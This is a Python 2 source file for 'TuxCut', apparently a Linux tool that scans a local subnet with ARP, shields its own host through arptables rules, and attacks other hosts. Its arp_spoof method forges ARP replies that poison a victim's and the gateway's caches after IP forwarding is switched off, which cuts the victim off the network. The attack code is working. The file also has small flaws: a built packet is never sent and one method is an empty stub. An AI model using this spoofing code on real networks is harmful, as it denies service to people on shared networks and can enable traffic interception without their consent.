#!/usr/bin/env python
import netinfo
from scapy.all import *
import subprocess as sp
import platform


class TuxCut:
    def __init__(self, interface):
        self.iface = interface
        distros = ['CentOS', 'Fedora']
        if platform.linux_distribution()[0] in distros:
            self.isfedora = True
        else:
            self.isfedora = False
        if not self.iface == '':
            print 'connected'
            self.myip = self.get_myip(self.iface)
            self.myhw = netinfo.get_hwaddr(self.iface)
            self.gwip = self.get_gwip()
            self.gwhw = self.get_gwhw()
            self.netmask = '24'
        else:
            print self.iface, 'No active connection detected'
            sys.exit()

    def get_iface(self):
        ifaces_list = []
        ifaces_tupel = netinfo.list_active_devs()
        for iface in ifaces_tupel:
            if not iface == 'lo':
                ifaces_list.append(iface)
        return ifaces_list[0]

    def get_myip(self, iface):
        return netinfo.get_ip(iface)

    def get_gwip(self):
        routes = netinfo.get_routes()
        for route in routes:
            if route['dest'] == '0.0.0.0' and route['dev'] == self.iface:
                return route['gateway']

    def get_gwhw(self):
        alive = []
        while len(alive) == 0:
            print 'Rescan'
            alive, dead = arping(self.gwip)
        return alive[0][1].hwsrc

    def get_live_hosts(self):
        live_hosts = dict()
        live_hosts[self.myip] = self.myhw.lower()
        try:
            alive, dead = arping(self.gwip+'/'+self.netmask,  verbose=False)
            for i in range(0, len(alive)):
                live_hosts[alive[i][1].psrc] = alive[i][1].hwsrc
        except:
            print sys.exc_info()[0], '\n', sys.exc_info()[1]
        return live_hosts

    def enable_protection(self):
        sp.Popen(['arptables', '-F'])
        if self.isfedora:
            print "This is a RedHat based distro "
            sp.Popen(['arptables', '-P', 'IN', 'DROP'])
            sp.Popen(['arptables', '-P', 'OUT', 'DROP'])
            sp.Popen(['arptables', '-A', 'IN', '-s', '%s' % self.gwip, '--source-hw', self.gwhw, '-j', 'ACCEPT'])
            sp.Popen(['arptables', '-A', 'OUT', '-d', '%s' % self.gwip, '--target-hw', self.gwhw, '-j', 'ACCEPT'])
        else:
            print "This is not a RedHat based distro"
            sp.Popen(['arptables', '-P', 'INPUT', 'DROP'])
            sp.Popen(['arptables', '-P', 'OUTPUT', 'DROP'])
            sp.Popen(['arptables', '-A', 'INPUT', '-s', self.gwip, '--source-mac', self.gwhw, '-j', 'ACCEPT'])
            sp.Popen(['arptables', '-A', 'OUTPUT', '-d', self.gwip, '--destination-mac', self.gwhw, '-j', 'ACCEPT'])
            sp.Popen(['arp', '-s', self.gwip, self.gwhw])

    def disable_protection(self):
        if self.isfedora:
            sp.Popen(['arptables', '-P', 'IN', 'ACCEPT'])
            sp.Popen(['arptables', '-P', 'OUT', 'ACCEPT'])
        else:
            sp.Popen(['arptables', '-P', 'INPUT', 'ACCEPT'])
            sp.Popen(['arptables', '-P', 'OUTPUT', 'ACCEPT'])
        sp.Popen(['arptables', '-F'])

    def enable_ip_forward(self):
        sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'])

    def disable_ip_forward(self):
        sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=0'])

    def arp_spoof(self, victim_ip, victim_hw):
        self.disable_ip_forward()
        # cheat the victim
        pkt_1 = ARP()
        pkt_1.op = 2
        pkt_1.psrc = self.gwip
        pkt_1.hwsrc = self.myhw
        pkt_1.pdst = victim_ip
        pkt_1.hwdst = victim_hw

        # cheat the gateway
        pkt_2 = ARP()
        pkt_2.op = 2
        pkt_2.psrc = victim_ip
        pkt_2.hwsrc = self.myhw
        pkt_2.pdst = self.gwip
        pkt_2.hwdst = self.gwhw

        send(pkt_1)
        send(pkt_1)

    def send_fake_packet(self, victimip):
        pass

